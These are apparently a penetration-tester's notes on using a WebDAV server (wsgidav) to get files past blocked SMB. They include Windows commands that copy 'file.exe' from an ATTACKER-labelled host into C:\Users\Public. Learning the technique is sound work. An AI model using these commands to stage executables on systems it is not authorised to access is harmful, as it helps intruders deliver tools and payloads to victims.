- WebDAV extend HTTP to provide file-server functionality
	- Useful when SMB/TCP 445 restricted but HTTP/HTTPS is available

---
## Installing WebDAV module
```bash
sudo pip3 install wsgidav cheroot
```

---
## Start WebDAV server and transfer file
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
- Inside Linux machine, move the file you want transfer to /tmp
```bash
cp file.exe /tmp
```
- From here we basically share the /tmp to webDAV
- Windows can access the webDAV server through \\ATTACKER\DavWWWRoot\
- So from Windows
```cmd
# To see the available directory
dir \\ATTACKER ip\DavWWWRoot
```
```cmd
# To download the file from Linux machine
copy \\ATTACKER\DavWWWRoot\file.exe C:\Users\Public\file.exe
```

